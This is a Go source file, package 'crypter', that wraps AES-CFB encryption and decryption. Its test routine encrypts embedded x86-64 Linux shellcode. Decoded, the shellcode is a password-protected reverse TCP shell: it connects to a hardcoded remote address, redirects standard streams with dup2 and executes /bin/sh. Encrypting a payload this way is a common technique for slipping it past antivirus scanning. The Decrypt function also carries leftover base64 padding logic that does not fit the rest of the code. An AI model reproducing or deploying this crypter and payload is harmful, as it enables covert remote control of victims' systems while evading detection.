package crypter

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"errors"
	"fmt"
	"io"
)

// Encrypt ...
func Encrypt(key []byte, text []byte) ([]byte, error) {

	// Init Cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Padding
	paddingLen := aes.BlockSize - (len(text) % aes.BlockSize)
	paddingText := bytes.Repeat([]byte{byte(paddingLen)}, paddingLen)
	textWithPadding := append(text, paddingText...)

	// Getting an IV
	ciphertext := make([]byte, aes.BlockSize+len(textWithPadding))
	iv := ciphertext[:aes.BlockSize]

	// Randomness
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	// Actual encryption
	cfbEncrypter := cipher.NewCFBEncrypter(block, iv)
	cfbEncrypter.XORKeyStream(ciphertext[aes.BlockSize:], textWithPadding)

	// // base64 padding
	// base64Ciphertext := []byte(base64.URLEncoding.EncodeToString(ciphertext))
	// result := []byte(bytes.Replace(base64Ciphertext, []byte("="), []byte(""), -1))

	return ciphertext, nil
}

// Decrypt ...
func Decrypt(key []byte, text []byte) ([]byte, error) {

	// Init decipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Padding
	textAfterPadding := text
	m := len(text) % 4
	if m != 0 {
		textAfterPadding = append(text, bytes.Repeat([]byte("="), 4-m)...)
	}

	// Decoding from base64
	// decodedCipherText, err := base64.URLEncoding.DecodeString(string(textAfterPadding))
	decodedCipherText := textAfterPadding
	// if err != nil {
	// return nil, err
	// }

	if (len(decodedCipherText) % aes.BlockSize) != 0 {
		return nil, errors.New("wrong blocksize")
	}

	// Getting the IV
	iv := decodedCipherText[:aes.BlockSize]

	// Actual decryption
	decodedCipherMsg := decodedCipherText[aes.BlockSize:]
	cfbDecrypter := cipher.NewCFBDecrypter(block, iv)
	cfbDecrypter.XORKeyStream(decodedCipherMsg, decodedCipherMsg)

	// Removing Padding
	length := len(decodedCipherMsg)
	paddingLen := int(decodedCipherMsg[length-1])
	result := decodedCipherMsg[:(length - paddingLen)]
	return result, nil
}

func test() {
	key := []byte(">follow @syscall59 on tt")
	fmt.Println("Key:")
	fmt.Println(key)

	text := []byte{0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x49, 0x89, 0xc7, 0x48, 0x97, 0x48, 0xb9, 0xfe, 0xff, 0xee, 0xa3, 0x80, 0xff, 0xff, 0xfe, 0x48, 0xf7, 0xd9, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0x4c, 0x89, 0xff, 0x6a, 0x04, 0x5a, 0x48, 0x29, 0xd4, 0x48, 0x89, 0xe6, 0x0f, 0x05, 0x48, 0xb8, 0x45, 0x49, 0x4e, 0x21, 0x4c, 0x45, 0x54, 0x4d, 0x48, 0x89, 0xf7, 0x48, 0xaf, 0x75, 0xde, 0x4c, 0x89, 0xff, 0x6a, 0x02, 0x5e, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x48, 0xff, 0xce, 0x79, 0xf6, 0x48, 0x31, 0xd2, 0x52, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x6a, 0x3b, 0x58, 0x0f, 0x05}
	fmt.Println("Text:")
	fmt.Println(text)

	encryptedMsg, err := Encrypt(key, text)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("Encrypted Message:")
		fmt.Println(encryptedMsg)
	}

	plaintextMsg, err := Decrypt(key, encryptedMsg)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("Plaintext Message:")
		fmt.Println(plaintextMsg)
	}
}
